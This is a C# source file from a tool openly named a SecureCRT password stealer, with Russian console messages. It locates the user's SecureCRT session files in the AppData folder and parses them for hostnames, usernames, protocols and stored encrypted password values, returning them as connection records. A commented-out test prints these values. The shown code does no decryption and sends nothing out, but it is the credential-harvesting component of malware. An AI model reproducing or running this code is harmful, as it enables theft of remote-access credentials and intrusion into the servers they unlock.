using System.Text.RegularExpressions;



namespace SCRTPasswordStealler.iniParser
{
    //internal class TEST
    //{
    //    static void Main(string[] args)
    //    {
    //        IniFilesPath files = new IniFilesPath("");
    //        //Console.WriteLine(files._ipFiles[1]);
    //        List<Connection> con = files.ParserConnections();

    //        foreach (var conn in con)
    //        {
    //            Console.WriteLine($"\n=== Найдено подключение ===");
    //            Console.WriteLine($"IP/Host: {conn.ip}");
    //            Console.WriteLine($"Username: {conn.username}");
    //            Console.WriteLine($"Protocol: {conn.protocol}");
    //            Console.WriteLine($"Password: {conn.password}");
    //            Console.WriteLine($"Длина пароля: {conn.password?.Length ?? 0}");
    //        }
    //    }
   

    internal class IniFilesPath
    {
        private static readonly Regex IpRegex = new Regex(
        @"\b(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b",
        RegexOptions.Compiled);

        public List<string> _ipFiles;
        private readonly List<Dictionary<string, Dictionary<string, string>>> _allFilesSections;


        public IniFilesPath(string directoryPath)
        {
            if (directoryPath == "" || directoryPath == null)
            {
                string appDataPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                directoryPath = Path.Combine(appDataPath, "VanDyke", "Config", "Sessions");
            }
            

            List<string> ipFiles = new List<string>();
            try
            {

                string[] allFiles = Directory.GetFiles(directoryPath);

                foreach (string filePath in allFiles)
                {
                    string fileName = Path.GetFileName(filePath);


                    if (IpRegex.IsMatch(fileName))
                    {
                        ipFiles.Add(filePath);
                        //Console.WriteLine($"Найден файл с IP: {fileName}");
                    }
                    
                }
                if(ipFiles.Count == 0)
                {
                    Console.WriteLine("Файлов конфигурации по данному пути не найдено");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Ошибка при чтении директории: {ex.Message}");
            }

            _ipFiles = ipFiles;
            _allFilesSections = new List<Dictionary<string, Dictionary<string, string>>>();
        }
        private void ParserFile()
        {

            foreach (string filePath in _ipFiles)
            {
                try
                {
                    if (!File.Exists(filePath))
                    {
                        Console.WriteLine($"Файл не существует: {filePath}");
                        continue;
                    }

                   
                    ParseSingleFile(filePath);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"Ошибка при парсинге файла {filePath}: {ex.Message}");
                }

            }
        }
        private void ParseSingleFile(string filePath)
        {
            var fileSections = new Dictionary<string, Dictionary<string, string>>();
            string currentSection = "Main";
            fileSections[currentSection] = new Dictionary<string, string>();

            var lines = File.ReadAllLines(filePath);

            foreach (var line in lines)
            {
                var trimmedLine = line.Trim();

          
                if (string.IsNullOrEmpty(trimmedLine) ||
                    trimmedLine.StartsWith("B:") ||
                    trimmedLine.StartsWith("Z:") ||
                    trimmedLine.StartsWith(" ") || 
                    trimmedLine.Length == 32 && trimmedLine.All(c => char.IsLetterOrDigit(c) || c == ' '))
                    continue;

                
                var sectionMatch = Regex.Match(trimmedLine, @"^\[([^\]]+)\]$");
                if (sectionMatch.Success)
                {
                    currentSection = sectionMatch.Groups[1].Value;
                    if (!fileSections.ContainsKey(currentSection))
                        fileSections[currentSection] = new Dictionary<string, string>();
                    
                }

                
                var stringMatch = Regex.Match(trimmedLine, @"^S:""([^""]+)""=([^=]*)$");
                if (stringMatch.Success)
                {
                    var key = stringMatch.Groups[1].Value.Trim();
                    var value = stringMatch.Groups[2].Value.Trim();
                    fileSections[currentSection][key] = value;
                    continue;
                }

                
                var dwordMatch = Regex.Match(trimmedLine, @"^D:""([^""]+)""=([^=]*)$");
                if (dwordMatch.Success)
                {
                    var key = dwordMatch.Groups[1].Value.Trim();
                    var value = dwordMatch.Groups[2].Value.Trim();
                    fileSections[currentSection][key] = value;
                    continue;
                }

              
                var keyValueMatch = Regex.Match(trimmedLine, @"^([^=]+)=([^=]*)$");
                if (keyValueMatch.Success)
                {
                    var key = keyValueMatch.Groups[1].Value.Trim();
                    var value = keyValueMatch.Groups[2].Value.Trim();

                    if (key.StartsWith("S:\"") && key.EndsWith("\""))
                        key = key.Substring(3, key.Length - 4);
                    else if (key.StartsWith("D:\"") && key.EndsWith("\""))
                        key = key.Substring(3, key.Length - 4);

                    fileSections[currentSection][key] = value;
                }

            }
            _allFilesSections.Add(fileSections);
        }

        public List<Connection> ParserConnections()
        {

            ParserFile();
            List<Connection> connections = new List<Connection>();
            foreach (var fileSect in _allFilesSections)
            {
                foreach (var section in fileSect)
                {
                    var properties = section.Value;

                    string username = properties.GetValueOrDefault("Username", "");
                    string password = string.IsNullOrEmpty(properties.GetValueOrDefault("Password V2", ""))
                   ? properties.GetValueOrDefault("Password", "")
                   : properties.GetValueOrDefault("Password V2", "");

                    string protocol = properties.GetValueOrDefault("Protocol Name", "");
                    string hostname = properties.GetValueOrDefault("Hostname", "");
                    
                    if (!string.IsNullOrEmpty(hostname) && (!string.IsNullOrEmpty(username) || !string.IsNullOrEmpty(password)))
                    {
                        Connection connection = new Connection();
                        connection.SetConnection(password.Substring(3), username, hostname, protocol);
                        connections.Add(connection);
                    }
                }


            }
            //Console.WriteLine(connections.Count);
            return connections;

        }

        
    }
    public class Connection
    {
        public string ip { get; set; }
        public string username { get; set; }
        public string protocol { get; set; }

        public string password { get; set; }
        public void SetConnection(string password, string username, string ip, string proto)
        {
            this.password = password;
            this.username = username;
            this.ip = ip;
            this.protocol = proto;

        }

    }
}
